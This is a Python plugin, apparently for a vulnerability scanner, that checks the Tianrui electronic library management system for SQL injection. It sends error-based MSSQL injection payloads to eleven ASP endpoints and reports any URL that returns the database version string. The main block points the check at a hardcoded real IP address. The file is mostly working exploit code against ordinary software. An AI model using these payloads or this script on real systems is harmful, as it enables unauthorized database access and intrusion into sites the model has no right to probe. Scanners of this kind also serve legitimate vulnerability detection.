#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:天睿电子图书管理系统系统10处注入打包 避免重复
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0120852/
#Author:xq17

def assign(service,arg):
    if service=="tianrui_lib":
        return True,arg
    
def audit(arg):
    urls = [
        arg + 'gl_tj_0.asp?id=1',
        arg + 'gl_tuijian_1.asp',
        arg + 'gl_tz_she.asp?zt=1&id=1',
        arg + 'gl_us_shan.asp?id=1',
        arg + 'gl_xiu.asp?id=1',
        arg + 'mafen.asp?shuxing=1',
        arg + 'ping_cha.asp?mingcheng=1',
        arg + 'ping_hao.asp?mingcheng=1',
        arg + 'pl_add.asp?id=1',
        arg + 'search.asp?keywords=1&shuxing=1',
    ]
    for url in urls:
        url += '%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
        code, head, res, err, _ = curl.curl2(url)
        if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
            security_hole("SQL Injection: " + url)
    url = arg + 'gl_tz_she.asp?zt=11%20WHERE%201=1%20AND%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--'
    code, head, res, err, _ = curl.curl2(url)
    if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
        security_hole("SQL Injection: " + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('tianrui_lib','http://218.92.71.5:1085/trebook/')[1])